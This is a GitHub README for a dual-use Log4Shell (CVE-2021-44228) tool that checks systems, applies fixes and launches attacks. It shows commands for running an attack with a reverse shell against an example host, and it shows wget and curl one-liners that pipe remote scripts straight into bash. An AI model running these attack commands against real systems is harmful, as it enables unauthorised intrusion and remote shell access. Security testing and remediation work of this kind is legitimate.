# log4shell4shell
Log4j - Multitool. Find &amp; fix possible CVE-2021-44228 vulneraries - provides a complete LOG4SHELL test/attack environment

![Thumb](/logo_banner.png )

# Features

- Check your Linux/Mac/BSD and Windows System for CVE-2021-44228 vulneraries
- Fix your system by deleting log4j java class / or setting some enviroment variables 
- Proof of Concept: you can run a dummy spring boot server for testing the exploit by yourself (https://github.com/christophetd/log4shell-vulnerable-app)
- You can run a attack against a wished IP-Port and include a Base64 Command / Or A simple Reverse Shell
- Full ip-range scanning by https://github.com/fullhunt/log4j-scan

# How to Run on Linux/Mac/BSD:

### Requirements:

- https://docs.docker.com/get-docker/
- Debian / Ubuntu: ```apt update ; apt install java python3 pip bash curl```
- OpenSuse: ```zypper ref ; zypper in java python3 pip bash curl```
- Redhead-Linux / CentOS: ```yum clean; yum install java python3 pip bash curl```
- BSD pkg: ```pkg install java python3 pip curl```
- Mac OS (Brew): ```/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" ; brew install java python3 pip curl```

### Quick check your system with this oneliner:

```bash
wget https://raw.githubusercontent.com/suuhm/log4shell4shell/main/log4shell4shell.sh -qO- | bash -s -- --check-system
```

### More Options
#### Run a sample attack against IP: 10.4.4.20 Port 8080 loginpage and additionally a Reverse Proxy Shell :

```bash
git clone https://github.com/suuhm/log4shell4shell ; cd log4shell4shell
mv log4shell4shell.sh l4s4s.sh && chmod +x l4s4s.sh
./l4s4s.sh --run-attack http://10.4.4.20:8080/login.php -e
```
Run ```screen -r l4s4s-ldap-srv``` and/or ```screen -r l4s4s-nc-rsh``` to view some attacking infos in Exploit-Server shell: 


#### Run a full scan  IP: 10.4.4.20 Port 8080 and additionally a try all tests :

```bash
./l4s4s.sh --python-scan "-u 10.4.4.20:8080 --run-all-tests"
```


### All available Options

```bash
_|                            _|  _|              _|                  _|  _|  _|  _|              _|                  _|  _|
_|          _|_|      _|_|_|  _|  _|      _|_|_|  _|_|_|      _|_|    _|  _|  _|  _|      _|_|_|  _|_|_|      _|_|    _|  _|
_|        _|    _|  _|    _|  _|_|_|_|  _|_|      _|    _|  _|_|_|_|  _|  _|  _|_|_|_|  _|_|      _|    _|  _|_|_|_|  _|  _|
_|        _|    _|  _|    _|      _|        _|_|  _|    _|  _|        _|  _|      _|        _|_|  _|    _|  _|        _|  _|
_|_|_|_|    _|_|      _|_|_|      _|    _|_|_|    _|    _|    _|_|_|  _|  _|      _|    _|_|_|    _|    _|    _|_|_|  _|  _|
                          _|
                      _|_|

 > Running Log4shell Framework & Check-Toolkit on shell v0.1a (C) 2021 suuhm
 

Usage: ./l4s4s.sh [OPTIONS] <IP:PORT|COMMAND>

                        --get-powershell-finder
                        --check-system
                        --fix-log4j
                        --run-dummy-server <LDAP-SERVER.zip>
                        --run-attack <FORMAT: IP:PORT> <-e/-t>
                        --python-scan <command>

```

# How to Run on Windows x86 / x64:

Just run in Powershell: ``` .\set_windows_fix.ps1 ```


### This script is alpha! So please let me know if you have some issues

### Legal Disclaimer

The project log4shell4shell is made for educational and ethical testing purposes only. Usage of log4j-scan for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
